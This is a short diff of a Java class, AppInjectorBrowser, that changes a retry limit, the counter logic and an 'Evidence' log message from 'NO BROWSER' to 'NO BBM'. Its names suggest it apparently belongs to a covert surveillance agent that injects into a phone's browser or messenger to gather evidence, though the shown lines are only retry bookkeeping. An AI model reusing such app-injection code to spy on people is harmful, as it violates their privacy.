@@ -30,7 +30,7 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
     private static AppInjectorBrowser instance;
     private static final long GUID = 0xa2b7338e410f087bL;
     private static final int DELAY = 5000;
-    private static final int MAX_TRIES = 12;
+    private static final int MAX_TRIES = 6;
 
     private int tries =0;
     private int delay = 100;
@@ -70,14 +70,14 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         debug.info("calling browser menu");
         //#endif
         
+        tries++;
         if(tries >= MAX_TRIES){
             //#ifdef DEBUG
             debug.error("callMenuByKey: too many tries");
             //#endif
-            if(tries++ == MAX_TRIES){
-                Evidence.info("NO BROWSER");
+            if(tries == MAX_TRIES){
+                Evidence.info("NO BBM");
             }
-
             return false;
         }
 
